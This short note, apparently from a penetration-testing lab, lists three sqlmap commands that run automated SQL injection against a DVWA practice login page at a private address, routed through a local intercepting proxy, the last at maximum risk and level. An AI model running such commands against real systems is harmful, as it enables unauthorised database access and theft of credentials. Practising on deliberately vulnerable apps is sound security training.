sql injection
sqlmap -u "http://192.168.122.170/dvwa/login.php" --data="username=a&password=a" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://192.168.122.170/dvwa/login.php" --method POST --data="username=test&password=test" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://192.168.122.170/dvwa/login.php" --data="username=test&password=test" --risk=3 --level=5 --proxy="http://127.0.0.1:8080" --batch



